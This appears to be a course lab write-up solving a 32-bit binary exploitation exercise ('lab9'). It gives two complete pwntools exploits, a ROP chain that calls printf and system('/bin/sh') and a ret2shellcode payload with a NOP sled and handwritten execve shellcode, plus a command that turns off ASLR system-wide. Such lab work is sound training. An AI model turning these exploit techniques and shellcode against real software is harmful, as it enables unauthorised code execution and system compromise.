# Lab-9
Lab 9 Pwn ROPchain / ret2shellcode solution

#### Check the binary protections

![image](https://github.com/user-attachments/assets/7a9f4329-53ea-4563-86cf-22f2c5ac274e)

#### Check the architechture Type

![image](https://github.com/user-attachments/assets/8b3406d1-8db0-4942-a550-373f0727282f)


### Solution 1 : ROP Way

**Turn Off ASLR**

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

![image](https://github.com/user-attachments/assets/d9fff15f-fd0b-4a6f-95eb-927b2071d71e)


**Leak Libc Base**
![image](https://github.com/user-attachments/assets/47b611e2-a27d-4139-a2fa-ccf25b80deca)


![image](https://github.com/user-attachments/assets/e6e89228-aeed-4f36-be61-ad313cb45100)

so our libc base address we got is : `0xf7d8b000`

we will use system function in the lab9 binary present to call '/bin/sh' from libc as addresses are static wont be an issue
& will print "I did it!"

`solver.py`
```py
import sys
from pwn import *

context.log_level = 'CRITICAL'
context.arch = 'i386'

binary = ELF("lab9")
libc = ELF("/usr/lib32/libc.so.6")

libc_base = 0xf7d66000
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

I_addr = libc_base + next(libc.search(b'I'))
d_addr = libc_base + next(libc.search(b'd'))
i_addr = libc_base + next(libc.search(b'i'))
t_addr = libc_base + next(libc.search(b'T'))
exclamation_addr = libc_base + next(libc.search(b'!'))

format_string = libc_base + next(libc.search(b'%s'))

rop = ROP(binary)

rop.call("printf", [format_string, I_addr])
rop.call("printf", [format_string, d_addr])
rop.call("printf", [format_string, i_addr])
rop.call("printf", [format_string, d_addr])
rop.call("printf", [format_string, i_addr])
rop.call("printf", [format_string, t_addr])
rop.call("printf", [format_string, exclamation_addr])

rop.call(system_addr, [bin_sh_addr])

padding = b"a" * 22
exploit = rop.chain()
payload = padding + exploit

sys.stdout.buffer.write(payload)
```

```
./lab9 $(python3 solver.py)
```
![image](https://gist.github.com/user-attachments/assets/1c6f15b4-93d0-4cca-8da3-c1af28b58b22)








## Ret2Shellcode Way Solution

![image](https://github.com/user-attachments/assets/209afafb-8d9c-41f3-b554-e150efaa470b)

Since our binary has an executable stack(RWX) (indicated by Stack: Executable and NX: NX unknown) 
a ret2shellcode approach is possible. This means we can inject shellcode directly onto the stack and then use a ROP chain to jump to it.

**Find Shellcode Address via GDB**

```bash
b unsafe

run $(python3 -c 'print("A" * 100)')

```

![image](https://github.com/user-attachments/assets/d719489d-1de9-4310-ab2a-42493415b2eb)

**Craft your Exploit**

```py
#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./lab9')
context.terminal = ['alacritty', '-e']

offset = 22
shellcode_addr = 0xffffcf50 # somewhere in the nop sled
message_addr = 0xffffd6bc

gs = """
b *main
continue
"""

shellcode = f"""
push 0x41410a21
push 0x74692064
push 0x69642049

push 4
pop eax
push 1
pop ebx
mov ecx, esp
push 10
pop edx
int 0x80

push 0x4168732f
push 0x6e69622f

xor eax, eax
mov byte [esp + 6], al

mov al, 11
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
"""

payload = b'A'*offset + pack(shellcode_addr)
payload += b'\x90' * 1000
payload += asm(shellcode)

io = process([elf.path, payload])
io.interactive()
```

#### Run it

```bash
python3 solver.py
```

![image](https://github.com/user-attachments/assets/4d8cb0b9-a08e-43f6-a658-8f53d2ded955)


![image](https://github.com/user-attachments/assets/f9687a27-24e8-4230-b8a7-4aa0141db6eb)


### GG We did it

![image](https://github.com/user-attachments/assets/ad93791e-fc88-4fe8-8f8a-9eae462643ab)

